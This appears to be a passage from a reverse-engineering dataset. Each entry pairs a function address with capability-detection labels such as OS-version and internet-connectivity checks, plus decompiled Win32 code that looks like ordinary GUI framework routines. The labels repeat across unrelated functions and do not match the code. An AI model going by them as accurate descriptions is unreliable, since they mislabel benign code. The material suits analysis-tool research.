        "decompiled_code": "\nvoid fcn.00460940(void)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    \n    *0x496594 = sub.kernel32.dll_GetCurrentThreadId_1();\n    while( true ) {\n        iVar1 = sub.kernel32.dll_WaitForSingleObject();\n        if (iVar1 != 0x102) break;\n        if (*0x496584 != 0) {\n            if (*(*0x496584 + 0x60) != 0) {\n                sub.user32.dll_GetCursorPos();\n                iVar1 = fcn.00443ab8();\n                if (iVar1 == 0) {\n                    fcn.00463414();\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 158
    },
    "0046099c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0046099c(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_CallNextHookEx(*0x49659c, arg_8h, arg_ch, arg_10h);\n    if ((-1 < arg_8h) && (*0x496584 != 0)) {\n        fcn.004621c4();\n    }\n    return uVar1;\n}\n",
        "token_count": 110
    },
    "004609e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004609e0(void)\n\n{\n    uint uStack20;\n    code *pcStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    if (*(*0x496584 + 0xad) == '\\0') {\n        if (*0x49659c == 0) {\n            uStack8 = 0x4609fd;\n            uStack8 = sub.kernel32.dll_GetCurrentThreadId_1();\n            uStack12 = 0;\n            pcStack16 = fcn.0046099c;\n            uStack20 = 3;\n            *0x49659c = sub.user32.dll_SetWindowsHookExA();\n        }\n        if (*0x496598 == 0) {\n            *0x496598 = sub.kernel32.dll_CreateEventA(0, 0, 0, 0);\n        }\n        if (*0x4965a0 == 0) {\n            *0x4965a0 = sub.kernel32.dll_CreateThread(0, 1000, fcn.00460940, 0, 0, &stack0xffffffec);\n        }\n    }\n    return;\n}\n",
        "token_count": 248
    },
    "00460a54": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "set application hook"
        ],
        "decompiled_code": "\nvoid fcn.00460a54(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x49659c != 0) {\n        sub.user32.dll_UnhookWindowsHookEx(*0x49659c);\n    }\n    *0x49659c = 0;\n    if (*0x4965a0 != 0) {\n        sub.kernel32.dll_SetEvent(*0x496598);\n        iVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n        if (iVar1 != *0x496594) {\n            sub.kernel32.dll_WaitForSingleObject(*0x4965a0, 0xffffffff);\n        }\n        sub.kernel32.dll_CloseHandle_1(*0x4965a0);\n        *0x4965a0 = 0;\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "00460ab0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint64_t fcn.00460ab0(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint auStack8 [2];\n    \n    auStack8[0] = 8;\n    uVar2 = 8;\n    uVar1 = sub.user32.dll_SystemParametersInfoA(0x48, 8, auStack8, 0);\n    if (uVar1 != 0) {\n        return CONCAT44(uVar2, uVar1 & 0xffffff00 | uVar2 != 0);\n    }\n    return uVar2 << 0x20;\n}\n",
        "token_count": 135
    },
    "00460ae0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00460ae0(void)\n\n{\n    char in_AL;\n    uint uStack8;\n    int32_t iStack4;\n    \n    uStack8 = 8;\n    iStack4 = -(in_AL != '\\0');\n    sub.user32.dll_SystemParametersInfoA(0x49, 8, &uStack8, 0);\n    return;\n}\n",
        "token_count": 81
    },
    "00460c54": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\ncode * __fastcall fcn.00460c54(uint param_1, char param_2)\n\n{\n    code **ppcVar1;\n    code *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint lpFilename;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    var_1h._0_1_ = param_2;\n    fcn.0041b50c();\n    ppcVar1 = *0x492ab0;\n    if (*(*0x492ab0 + 2) == 0) {\n        (*0x492ab0)[1] = in_EAX;\n        *ppcVar1 = fcn.00462704;\n    }\n    ppcVar1 = *0x492b80;\n    if (*(*0x492b80 + 2) == 0) {\n        (*0x492b80)[1] = in_EAX;\n        *ppcVar1 = fcn.00462910;\n    }\n    in_EAX[0x34] = 0x0;\n    uVar2 = fcn.00403f28();\n    *(in_EAX + 0x90) = uVar2;\n    uVar2 = fcn.00403f28();\n    *(in_EAX + 0x98) = uVar2;\n    uVar2 = fcn.00403f28();\n    *(in_EAX + 0xb0) = uVar2;\n    *(in_EAX + 0x60) = 0;\n    *(in_EAX + 0x84) = 0;\n    *(in_EAX + 0x5c) = 0xff000018;\n    *(in_EAX + 0x78) = 500;\n    in_EAX[0x7c] = 0x1;\n    *(in_EAX + 0x80) = 0;\n    *(in_EAX + 0x74) = 0x9c4;\n    in_EAX[0x88] = 0x0;\n    in_EAX[0xa5] = 0x1;\n    in_EAX[0xbc] = 0x1;\n    uVar2 = fcn.00427be0();\n    *(in_EAX + 0xa0) = uVar2;\n    sub.user32.dll_LoadIconA(**0x4929c0, 0x460e64);\n    fcn.00427fb4();\n    iVar3 = *(in_EAX + 0xa0);\n    *(iVar3 + 0x14) = in_EAX;\n    *(iVar3 + 0x10) = 0x462fe0;\n    sub.kernel32.dll_GetModuleFileNameA_1(**0x4929c0, &lpFilename, 0x100);\n    sub.user32.dll_OemToCharA(&lpFilename, &lpFilename);\n    iVar3 = fcn.0040d448();\n    if (iVar3 != 0) {\n        fcn.004095a4();\n    }\n    puVar4 = fcn.0040d47c();\n    if (puVar4 != NULL) {\n        *puVar4 = 0;\n    }\n    uVar2 = sub.user32.dll_CharNextA_1(&lpFilename);\n    sub.user32.dll_CharLowerA(uVar2);\n    fcn.00405010();\n    in_EAX[0xd4] = 0x0;\n    uVar5 = 0x462264;\n    uVar2 = fcn.0041c69c(0x462264, in_EAX);\n    *(in_EAX + 200) = uVar2;\n    if (**0x492880 == '\\0') {\n        fcn.00460fa8();\n    }\n    in_EAX[0x59] = 0x1;\n    in_EAX[0x5a] = 0x1;\n    in_EAX[0x5b] = 0x1;\n    in_EAX[0xa6] = 0x1;\n    *(in_EAX + 0xa8) = 0;\n    fcn.004631bc();\n    fcn.00463d1c();\n    if (var_1h != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uVar5;\n    }\n    return in_EAX;\n}\n",
        "token_count": 1041
    },
    "00460fa8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00460fa8(void)\n\n{\n    int16_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint in_stack_00000030;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_2ch;\n    uint lpWndClass;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    puStack56 = &stack0xfffffffc;\n    uStack60 = 0x461149;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    if ((*(in_EAX + 0xac) == '\\0') && (**0x492bd0 == '\\0')) {\n        uVar2 = fcn.0041c5e0(fcn.004616b0, in_EAX);\n        *(in_EAX + 0x40) = uVar2;\n        *0x49183c = sub.user32.dll_DefWindowProcA;\n        iVar3 = sub.user32.dll_GetClassInfoA(*0x4957f4, *0x49185c, &fcn.00460fa8::lpWndClass);\n        if (iVar3 == 0) {\n            *0x491848 = *0x4957f4;\n            iVar1 = sub.user32.dll_RegisterClassA(0x491838);\n            if (iVar1 == 0) {\n                fcn.00406a50();\n                fcn.0040c5ac();\n                fcn.004047cc();\n            }\n        }\n        uVar4 = (***0x4929e4)(0);\n        iVar3 = uVar4 >> 1;\n        if (iVar3 < 0) {\n            iVar3 = iVar3 + ((uVar4 & 1) != 0);\n        }\n        uVar4 = (***0x4929e4)(1, iVar3);\n        uVar2 = *0x4957f4;\n        iVar3 = uVar4 >> 1;\n        if (iVar3 < 0) {\n            iVar3 = iVar3 + ((uVar4 & 1) != 0);\n        }\n        fcn.00405264();\n        uVar2 = fcn.004077b4(0, uVar2, 0, 0, 0, 0, iVar3, in_stack_00000030);\n        *(in_EAX + 0x30) = uVar2;\n        fcn.00404da0();\n        *(in_EAX + 0xac) = 1;\n        uStack20 = *(in_EAX + 0x30);\n        sub.user32.dll_SetWindowLongA();\n        if (**0x492a6c != '\\0') {\n            fcn.00461dc4();\n            uStack8 = *(in_EAX + 0x30);\n            uStack12 = 0x4610e2;\n            sub.user32.dll_SendMessageA();\n            uStack12 = 0x4610e9;\n            uStack12 = fcn.00461dc4();\n            uStack16 = 0xfffffff2;\n            uStack20 = *(in_EAX + 0x30);\n            uStack24 = 0x4610f5;\n            sub.user32.dll_SetClassLongA();\n        }\n        uStack24 = 0;\n        uStack28 = *(in_EAX + 0x30);\n        uStack32 = 0x461100;\n        uVar2 = sub.user32.dll_GetSystemMenu();\n        uStack32 = 0;\n        uStack36 = 0xf030;\n        lpWndClass = 0x46110f;\n        uStack40 = uVar2;\n        sub.user32.dll_DeleteMenu();\n        lpWndClass = 0;\n        puStack56 = 0x46111c;\n        uStack64 = uVar2;\n        sub.user32.dll_DeleteMenu();\n        if (**0x492a6c != '\\0') {\n            puStack56 = NULL;\n            uStack60 = 0xf010;\n            uStack64 = uVar2;\n            sub.user32.dll_DeleteMenu();\n        }\n    }\n    *in_FS_OFFSET = uStack64;\n    puStack56 = 0x461150;\n    uStack60 = 0x461148;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 1015
    },
    "004611b8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004611b8(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    \n    uVar3 = 0xffffffff;\n    iVar1 = func_0x0040749c(arg_8h, 4);\n    if (iVar1 == *(*0x496584 + 0x30)) {\n        uVar2 = sub.user32.dll_GetWindowLongA(arg_8h, 0xffffffec);\n        if (((uVar2 & 8) == 0) ||\n           (((*(*0x496584 + 0x44) != 0 && (*(arg_ch + 1) == '\\0')) && (iVar1 = fcn.0044d1c8(),  arg_8h == iVar1)))) {\n            *arg_ch = arg_8h;\n            uVar3 = 0;\n        }\n        else {\n            fcn.00414d8c();\n        }\n        return uVar3;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 238
    },
    "00461228": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00461228(uint param_1, uchar param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uint uStack16;\n    uchar uStack12;\n    \n    if (*(*0x496584 + 0x30) != 0) {\n        if (*(in_EAX + 0x94) == 0) {\n            uStack16 = *(in_EAX + 0x30);\n            pcVar4 = fcn.004611b8;\n            uStack12 = param_2;\n            sub.user32.dll_EnumWindows(fcn.004611b8, &uStack16);\n            if (*(*(in_EAX + 0x90) + 8) != 0) {\n                uVar1 = func_0x0040749c(pcVar4, 3);\n                uVar2 = sub.user32.dll_GetWindowLongA(uVar1, 0xffffffec, uVar1);\n                if ((uVar2 & 8) != 0) {\n                    uVar1 = 0xfffffffe;\n                }\n                iVar3 = *(*(in_EAX + 0x90) + 8) + -1;\n                if (-1 < iVar3) {\n                    do {\n                        uVar1 = fcn.00414eec(uVar1, 0, 0, 0, 0, 0x213);\n                        sub.user32.dll_SetWindowPos();\n                        iVar3 = iVar3 + -1;\n                    } while (iVar3 != -1);\n                }\n            }\n        }\n        *(in_EAX + 0x94) = *(in_EAX + 0x94) + 1;\n    }\n    return;\n}\n",
        "token_count": 393
    },
    "004612d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004612d8(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0xc4) = *(in_EAX + 0xc4) + 1;\n    if ((*(in_EAX + 0xc4) == 1) && (*(in_EAX + 0x10a) != 0)) {\n        (**(in_EAX + 0x108))();\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "00461390": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00461390(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (((*(*0x496584 + 0x30) != 0) && (0 < *(in_EAX + 0x94))) &&\n       (*(in_EAX + 0x94) = *(in_EAX + 0x94) + -1,  *(in_EAX + 0x94) == 0)) {\n        iVar1 = *(*(in_EAX + 0x90) + 8) + -1;\n        if (-1 < iVar1) {\n            do {\n                fcn.00414eec(0xffffffff, 0, 0, 0, 0, 0x213);\n                sub.user32.dll_SetWindowPos();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n        (**(**(in_EAX + 0x90) + 8))();\n    }\n    return;\n}\n",
        "token_count": 221
    },
    "0046146c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046146c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(*0x496584 + 0x30) != 0) {\n        if (param_2 == '\\0') {\n            if (*(in_EAX + 0x9c) == 0) {\n                sub.user32.dll_EnumWindows(fcn.004613fc, 0);\n                iVar1 = *(*(in_EAX + 0x98) + 8);\n                if ((0 < iVar1) && (iVar1 = iVar1 + -1,  -1 < iVar1)) {\n                    do {\n                        fcn.00414eec(0);\n                        sub.user32.dll_ShowOwnedPopups();\n                        iVar1 = iVar1 + -1;\n                    } while (iVar1 != -1);\n                }\n            }\n            *(in_EAX + 0x9c) = *(in_EAX + 0x9c) + 1;\n        }\n        else if ((0 < *(in_EAX + 0x9c)) && (*(in_EAX + 0x9c) = *(in_EAX + 0x9c) + -1,  *(in_EAX + 0x9c) == 0)) {\n            iVar1 = *(*(in_EAX + 0x98) + 8);\n            if ((0 < iVar1) && (iVar1 = iVar1 + -1,  -1 < iVar1)) {\n                do {\n                    fcn.00414eec(-(param_2 != '\\0'));\n                    sub.user32.dll_ShowOwnedPopups();\n                    iVar1 = iVar1 + -1;\n                } while (iVar1 != -1);\n            }\n            (**(**(in_EAX + 0x98) + 8))();\n        }\n    }\n    return;\n}\n",
        "token_count": 411
    },
    "00461534": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00461534(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x492d08 + 0xd) != '\\0') && (*(in_EAX + 0x34) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 67
    },
    "00461564": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00461564(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((*param_2 == *0x496590) || (*param_2 == 0x1a)) {\n        if (*(in_EAX + 0x59) != '\\0') {\n            sub.kernel32.dll_SetThreadLocale(0x400);\n            fcn.0040d5dc();\n        }\n        if (*(in_EAX + 0x5a) != '\\0') {\n            fcn.00460208();\n        }\n        if (*param_2 == *0x496590) {\n            fcn.00460888();\n        }\n    }\n    return 0;\n}\n",
        "token_count": 161
    },
    "004615bc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004615bc(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x461619;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (*(in_EAX + 0x162) != 0) {\n        fcn.00404f98();\n        (**(in_EAX + 0x160))(param_2 + 0xc, 0);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x461620;\n    uStack24 = 0x461618;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 206
    },
    "00461de0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00461de0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = sub.user32.dll_IsIconic(*(in_EAX + 0x30));\n    if (iVar1 != 0) {\n        return;\n    }\n    fcn.00461330();\n    sub.user32.dll_SetActiveWindow(*(in_EAX + 0x30));\n    fcn.0046146c();\n    if ((*(in_EAX + 0x44) != 0) && ((*(in_EAX + 0x5b) != '\\0' || (*(*(in_EAX + 0x44) + 0x57) != '\\0')))) {\n        uVar2 = fcn.0044d1c8();\n        iVar1 = sub.user32.dll_IsWindowEnabled(uVar2);\n        if (iVar1 != 0) {\n            uVar2 = fcn.0045a3a4(*(*(in_EAX + 0x44) + 0x48), 0, 0x40);\n            uVar2 = fcn.0045a384(uVar2);\n            uVar2 = fcn.0044d1c8(uVar2);\n            sub.user32.dll_SetWindowPos(*(in_EAX + 0x30), uVar2);\n            sub.user32.dll_DefWindowProcA(*(in_EAX + 0x30), 0x112, 0xf020, 0);\n            goto code_r0x00461e87;\n        }\n    }\n    fcn.00460b08();\ncode_r0x00461e87:\n    if (*(in_EAX + 0x142) != 0) {\n        (**(in_EAX + 0x140))();\n    }\n    return;\n}\n",
        "token_count": 399
    },
    "00461ea4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00461ea4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    \n    iVar1 = sub.user32.dll_IsIconic(*(in_EAX + 0x30));\n    if (iVar1 == 0) {\n        return;\n    }\n    sub.user32.dll_SetActiveWindow(*(in_EAX + 0x30));\n    if ((*(in_EAX + 0x44) != 0) && ((*(in_EAX + 0x5b) != '\\0' || (*(*(in_EAX + 0x44) + 0x57) != '\\0')))) {\n        uVar2 = fcn.0044d1c8();\n        iVar1 = sub.user32.dll_IsWindowEnabled(uVar2);\n        if (iVar1 != 0) {\n            sub.user32.dll_DefWindowProcA(*(in_EAX + 0x30), 0x112, 0xf120, 0);\n            goto code_r0x00461f0d;\n        }\n    }\n    fcn.00460b08();\ncode_r0x00461f0d:\n    uVar3 = (***0x4929e4)(1, 0, 0, 0x40);\n    iVar1 = uVar3 >> 1;\n    if (iVar1 < 0) {\n        iVar1 = iVar1 + ((uVar3 & 1) != 0);\n    }\n    uVar3 = (***0x4929e4)(0, iVar1);\n    iVar1 = uVar3 >> 1;\n    if (iVar1 < 0) {\n        iVar1 = iVar1 + ((uVar3 & 1) != 0);\n    }\n    sub.user32.dll_SetWindowPos(*(in_EAX + 0x30), 0, iVar1);\n    iVar1 = *(in_EAX + 0x44);\n    if (((iVar1 != 0) && (*(iVar1 + 0x273) == '\\x01')) && (*(iVar1 + 0x57) == '\\0')) {\n        fcn.0045c000();\n        fcn.0045ea50();\n    }\n    fcn.00461390();\n    fcn.0046146c();\n    if (*(*0x496588 + 100) != 0) {\n        uVar2 = fcn.0044d1c8();\n        sub.user32.dll_SetFocus(uVar2);\n    }\n    if (*(in_EAX + 0x14a) != 0) {\n        (**(in_EAX + 0x148))();\n    }\n    return;\n}\n",
        "token_count": 587
    },
    "00461fec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00461fec(void)\n\n{\n    int32_t in_EAX;\n    uchar auStack264 [256];\n    \n    if (*(in_EAX + 0xac) == '\\0') {\n        fcn.00404df4();\n    }\n    else {\n        sub.user32.dll_GetWindowTextA(*(in_EAX + 0x30), auStack264, 0x100);\n        fcn.00404e90();\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "00462038": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00462038(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    bool bVar2;\n    \n    bVar2 = false;\n    if (*(in_EAX + 0xb8) != 0) {\n        iVar1 = sub.user32.dll_IsWindowUnicode(*param_2);\n        if (iVar1 == 0) {\n            iVar1 = sub.user32.dll_IsDialogMessageA(*(in_EAX + 0xb8), param_2);\n            bVar2 = iVar1 != 0;\n        }\n        else {\n            iVar1 = sub.user32.dll_IsDialogMessageW(*(in_EAX + 0xb8), param_2);\n            bVar2 = iVar1 != 0;\n        }\n    }\n    return bVar2;\n}\n",
        "token_count": 184
    },
    "00462080": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00462080(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    bool bVar2;\n    \n    bVar2 = false;\n    iVar1 = *(in_EAX + 0x44);\n    if ((((iVar1 != 0) && (*(iVar1 + 0x277) == '\\x02')) && (*(*0x496588 + 0x6c) != 0)) &&\n       (*(*(*0x496588 + 0x6c) + 0x277) == '\\x01')) {\n        iVar1 = sub.user32.dll_TranslateMDISysAccel(*(iVar1 + 0x29c), param_2);\n        bVar2 = iVar1 != 0;\n    }\n    return bVar2;\n}\n",
        "token_count": 183
    },
    "004621f8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint64_t fcn.004621f8(void)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    \n    if (*(in_EAX + 0x152) != 0) {\n        (**(in_EAX + 0x150))();\n    }\n    if (*(in_EAX + 0x44) != 0) {\n        uVar3 = fcn.0044d1c8();\n        iVar4 = sub.user32.dll_IsWindowEnabled(uVar3);\n        if ((iVar4 != 0) && (cVar1 = fcn.00404154(),  cVar1 != '\\0')) {\n            uVar2 = 1;\n            goto code_r0x00462255;\n        }\n    }\n    uVar2 = 0;\ncode_r0x00462255:\n    return CONCAT14(uVar2, uVar2);\n}\n",
        "token_count": 211
    },
    "00462300": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00462300(uint param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    char cStackY68;\n    int32_t *in_stack_ffffffc0;\n    \n    uVar4 = 0;\n    iVar3 = sub.user32.dll_PeekMessageA(param_2, 0, 0, 0, 0, param_1);\n    if (iVar3 == 0) goto code_r0x0046240a;\n    if (*param_2 == 0) {\ncode_r0x00462331:\n        bVar1 = false;\n    }\n    else {\n        iVar3 = sub.user32.dll_IsWindowUnicode();\n        if (iVar3 == 0) goto code_r0x00462331;\n        bVar1 = true;\n    }\n    in_stack_ffffffc0 = param_2;\n    if (bVar1) {\n        iVar3 = sub.user32.dll_PeekMessageW(param_2, 0, 0, 0, 1);\n    }\n    else {\n        iVar3 = sub.user32.dll_PeekMessageA(param_2, 0, 0, 0, 1);\n    }\n    if (iVar3 != 0) {\n        uVar4 = 1;\n        if (param_2[1] == 0x12) {\n            *(in_EAX + 0xa4) = 1;\n        }\n        else {\n            in_stack_ffffffc0 = in_stack_ffffffc0 & 0xffff00ff;\n            if (*(in_EAX + 0x102) != 0) {\n                (**(in_EAX + 0x100))();\n            }\n            cVar2 = fcn.00463d3c();\n            if (cVar2 == '\\0') {\n                cVar2 = fcn.004621c4();\n                if ((cVar2 == '\\0') && (in_stack_ffffffc0 >> 8 == '\\0')) {\n                    cVar2 = fcn.00462080();\n                    if (cVar2 == '\\0') {\n                        cVar2 = fcn.004620d0();\n                        if (cVar2 == '\\0') {\n                            cVar2 = fcn.00462038();\n                            if (cVar2 == '\\0') {\n                                sub.user32.dll_TranslateMessage();\n                                cStackY68 = param_2;\n                                if (cStackY68 == '\\0') {\n                                    sub.user32.dll_DispatchMessageA();\n                                    in_stack_ffffffc0 = param_2;\n                                }\n                                else {\n                                    sub.user32.dll_DispatchMessageW();\n                                    in_stack_ffffffc0 = param_2;\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0046240a:\n    return CONCAT44(in_stack_ffffffc0, uVar4);\n}\n",
        "token_count": 654
    },
    "00462438": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
